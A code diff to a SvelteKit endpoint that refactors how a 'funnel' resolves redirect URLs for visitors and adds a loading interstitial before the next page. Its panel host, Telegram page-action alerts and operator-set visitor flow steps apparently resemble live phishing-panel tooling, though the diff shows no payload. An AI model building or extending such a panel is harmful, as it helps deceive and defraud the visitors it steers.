@@ -13,7 +13,7 @@ import { json, type RequestHandler } from '@sveltejs/kit';
 import { serverState } from '$lib/server/state';
 import { broadcast } from '$lib/server/websocket';
 import { notifyPageAction } from '$lib/server/telegram';
-import { labelToUrl, labelToVisitorUrl } from '$lib/server/funnel';
+import { applyLoadingInterstitial, resolveLabelRedirectUrl } from '$lib/server/funnel';
 import { dbSetVisitorFlowSteps } from '$lib/server/database';
 
 const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
@@ -49,13 +49,7 @@ const STEP_DEFAULT_NEXT: Record<string, string> = {
 };
 
 function resolveUrl(label: string, module: string, isVisitorHost: boolean, qp?: URLSearchParams): string | null {
-	if (isVisitorHost) {
-		return labelToVisitorUrl(label, module, qp?.size ? qp : undefined);
-	}
-	const base = labelToUrl(label);
-	if (!base) return null;
-	const qs = qp?.toString();
-	return qs ? `${base}?${qs}` : base;
+	return resolveLabelRedirectUrl(label, module, isVisitorHost, qp?.size ? qp : undefined);
 }
 
 export const POST: RequestHandler = async ({ request, getClientAddress, url }) => {
@@ -155,5 +149,9 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 		).catch(() => {});
 	}
 
-	return json({ ok: true, nextUrl });
+	const outbound = applyLoadingInterstitial(nextUrl, qp.size ? qp : undefined, {
+		isVisitorHost
+	});
+
+	return json({ ok: true, nextUrl: outbound });
 };
